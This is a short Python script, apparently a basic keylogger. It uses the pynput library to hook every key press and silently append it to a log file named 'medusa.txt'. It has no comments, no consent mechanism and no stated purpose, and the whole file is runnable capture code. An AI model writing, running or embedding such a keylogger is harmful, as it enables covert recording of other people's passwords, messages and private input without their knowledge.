from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "medusa.txt"), level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()